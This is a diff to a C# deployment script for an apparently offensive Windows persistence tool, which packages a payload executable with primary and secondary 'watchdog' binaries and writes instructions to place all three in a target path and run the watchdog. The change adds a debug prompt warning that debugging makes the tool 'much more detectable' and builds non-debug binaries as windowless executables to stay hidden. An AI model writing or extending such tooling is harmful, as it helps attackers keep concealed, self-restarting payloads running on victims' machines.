@@ -6,12 +6,33 @@ using System.Text.RegularExpressions;
 
 public class Deployment
 {
+    private static bool debugging = false;
     public static void Main(string[] args)
     {
         switchToDeploymentFolder();
 
-        try
+        Console.WriteLine("Would you like to deploy with debugging enabled and debugging tools?");
+        Console.WriteLine("WARNING: Only use for testing, makes tool much more detectable.");
+        Console.WriteLine();
+        Console.WriteLine("1. Yes, deploy with debugging.");
+        Console.WriteLine("2. No, deploy without debugging.");
+        Console.Write("Please enter your choice (1 or 2): ");
+
+        string choice = Console.ReadLine();
+
+        if (choice == "1")
         {
+            debugging = true;
+        }
+        else if (choice == "2")
+        {
+        }
+        else
+        {
+            Console.WriteLine("Invalid choice, restart the program and try again.");
+            Environment.Exit(1);
+        }
+
             string? parentPath = Directory.GetParent(Directory.GetCurrentDirectory())?.FullName; //       \WindowsPersistence\ Folder
             string DeploymentPath = Path.Combine(parentPath, "Deployment", "DeployBins");
 
@@ -35,10 +56,13 @@ public class Deployment
                         continue;
                     }
                     string iteratedConfigPath = Path.Combine(dir, "Config.cs");
-                    (string PrimaryWatchdogName, string SecondaryWatchdogName, string payloadName) binaryNames = GetWatchdogNames(iteratedConfigPath);
+
+                    string secondaryName = GetVarNames(iteratedConfigPath, @"public static string SecondaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");
+                    string primaryName = GetVarNames(iteratedConfigPath, @"public static string PrimaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");
+                    string payloadName = GetVarNames(iteratedConfigPath, @"public static string PayloadName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");
 
 
-                    (string fullPath, string lastDirectory) watchdogInfo = GetPrimaryWatchdogPathInfo(iteratedConfigPath);
+                (string fullPath, string lastDirectory) watchdogInfo = GetPrimaryWatchdogPathInfo(iteratedConfigPath);
                     string dirName = "Deployment" + i + "To-" + watchdogInfo.lastDirectory;
 
                     string iteratedOutputBinsPath = Path.Combine(parentPath, "Deployment", "DeployBins", dirName);
@@ -46,23 +70,23 @@ public class Deployment
                     ReplaceConfigFile(ConfigFilePath, iteratedConfigPath); // replaces the project's config file with the one for current deploy
                     Directory.CreateDirectory(iteratedOutputBinsPath);
 
-                    string txtFileContent = watchdogInfo.fullPath + "\n\n\n" + "^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^\n\n" + "Payload Name: " + binaryNames.payloadName + ".exe\n" + "Primary Watchdog Name: " + binaryNames.PrimaryWatchdogName + ".exe\n" + "Secondary Watchdog Name: " + binaryNames.SecondaryWatchdogName + ".exe";
+                    string txtFileContent = watchdogInfo.fullPath + "\n\n\n" + "^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^\n\n" + "Payload Name: " + payloadName + ".exe\n" + "Primary Watchdog Name: " + primaryName + ".exe\n" + "Secondary Watchdog Name: " + secondaryName + ".exe";
                         
 
 
                     File.WriteAllText(Path.Combine(iteratedOutputBinsPath, "DeployPath.txt"), txtFileContent); //write the primary watchdog path to a .txt
 
 
-                    
-                    Publish(primaryWatchDogProjectPath, iteratedOutputBinsPath, binaryNames.PrimaryWatchdogName);
-                    Publish(secondaryWatchDogProjectPath, iteratedOutputBinsPath, binaryNames.SecondaryWatchdogName);
+                    SetDebuggingValue(iteratedConfigPath, debugging);
+                    Publish(primaryWatchDogProjectPath, iteratedOutputBinsPath, primaryName);
+                    Publish(secondaryWatchDogProjectPath, iteratedOutputBinsPath, secondaryName);
 
                     string[] exeFiles = Directory.GetFiles(dir, "*.exe");
                     string iteratedPayloadPath = exeFiles[0];
 
-                    File.Copy(iteratedPayloadPath, Path.Combine(iteratedOutputBinsPath, binaryNames.payloadName + ".exe"), true);
+                    File.Copy(iteratedPayloadPath, Path.Combine(iteratedOutputBinsPath, payloadName + ".exe"), true);
 
-                    CleanDirectory(iteratedOutputBinsPath, binaryNames.PrimaryWatchdogName, binaryNames.SecondaryWatchdogName, binaryNames.payloadName);
+                    CleanDirectory(iteratedOutputBinsPath, primaryName, secondaryName, payloadName);
 
                     i++;
                 }
@@ -71,11 +95,7 @@ public class Deployment
             {
                 Console.WriteLine("Directory does not exist: " + fullPath);
             }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("An error occurred: " + ex.Message);
-        }
+       
 
     }
 
@@ -117,8 +137,11 @@ public class Deployment
 
     public static void Publish(string projectPath, string outputPath, string assemblyName)
     {
+
+        string outputType = debugging ? "Exe" : "WinExe"; //makes all of the window s
+
         // Build the dotnet publish arguments
-        var publishArgs = $"publish \"{projectPath}\" -o \"{outputPath}\" -p:AssemblyName=\"{assemblyName}\"";
+        var publishArgs = $"publish \"{projectPath}\" -o \"{outputPath}\" -p:AssemblyName=\"{assemblyName}\" -p:OutputType={outputType}";
 
         // Debug: Print the arguments to ensure they are correct
         Console.WriteLine($"Publish Arguments: {publishArgs}");
@@ -167,56 +190,35 @@ public class Deployment
 
 
 
-    public static (string PrimaryWatchdogName, string SecondaryWatchdogName, string payloadName) GetWatchdogNames(String filePath)
+    public static string GetVarNames(String filePath, String regex)
     {
-
         try
         {
             string fileContent = File.ReadAllText(filePath);
             // Regular expressions to match the SecondaryWatchdogName and PrimaryWatchdogName values
-            string secondaryPattern = @"public static string SecondaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";";
-            string primaryPattern = @"public static string PrimaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";";
-            string payloadPattern = @"public static string PayloadName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";";
+        
 
 
             // Extract the values using regex
-            var secondaryMatch = Regex.Match(fileContent, secondaryPattern);
-            var primaryMatch = Regex.Match(fileContent, primaryPattern);
-            var payloadMatch = Regex.Match(fileContent, payloadPattern);
+            var Match = Regex.Match(fileContent, regex);
 
-            if (secondaryMatch.Success)
+
+            if (Match.Success)
             {
-                Console.WriteLine("SecondaryWatchdogName: " + secondaryMatch.Groups[1].Value);
+                Console.WriteLine("Variable string found for regex: " + Match.Groups[1].Value);
             }
             else
             {
-                Console.WriteLine("SecondaryWatchdogName not found.");
+                Console.WriteLine("variable not found for regex.");
             }
 
-            if (primaryMatch.Success)
-            {
-                Console.WriteLine("PrimaryWatchdogName: " + primaryMatch.Groups[1].Value);
-            }
-            else
-            {
-                Console.WriteLine("PrimaryWatchdogName not found.");
-            }
 
-            if (payloadMatch.Success)
-            {
-                Console.WriteLine("payloadName: " + payloadMatch.Groups[1].Value);
-            }
-            else
-            {
-                Console.WriteLine("payloadName not found.");
-            }
-
-            return (primaryMatch.Groups[1].Value, secondaryMatch.Groups[1].Value, payloadMatch.Groups[1].Value);
+            return (Match.Groups[1].Value);
         }
         catch (Exception ex)
         {
             Console.WriteLine("Error reading the file: " + ex.Message);
-           return (null, null, null);
+           return (null);
         }
     }
 
@@ -321,6 +323,50 @@ public class Deployment
         catch (Exception ex)
         {
             Console.WriteLine($"Error cleaning directory: {ex.Message}");
+        }
+    }
+
+    public static void SetDebuggingValue(string filePath, bool debuggingValue)
+    {
+        try
+        {
+            // Read the file content
+            string fileContent = File.ReadAllText(filePath);
+
+            // Find the line that starts with "public static bool Debugging"
+            string searchPattern = "public static bool Debugging";
+            int startIndex = fileContent.IndexOf(searchPattern);
+            if (startIndex == -1)
+            {
+                Console.WriteLine("Debugging field not found in the file.");
+                return;
+            }
+
+            // Find the current value (true or false) and replace it
+            int valueStartIndex = fileContent.IndexOf('=', startIndex) + 1;
+            int valueEndIndex = fileContent.IndexOf(';', valueStartIndex);
+            if (valueStartIndex == -1 || valueEndIndex == -1)
+            {
+                Console.WriteLine("Debugging value format is incorrect.");
+                return;
+            }
+
+            // Extract the current value
+            string currentValue = fileContent.Substring(valueStartIndex, valueEndIndex - valueStartIndex).Trim();
+
+            // Replace the current value with the new value
+            string newValue = debuggingValue.ToString().ToLower(); // Use lowercase for 'true' or 'false'
+            fileContent = fileContent.Remove(valueStartIndex, valueEndIndex - valueStartIndex)
+                                      .Insert(valueStartIndex, $" {newValue} ");
+
+            // Write the updated content back to the file
+            File.WriteAllText(filePath, fileContent);
+
+            Console.WriteLine($"Successfully updated Debugging to {debuggingValue} in {filePath}");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error modifying the file: {ex.Message}");
         }
     }
 }
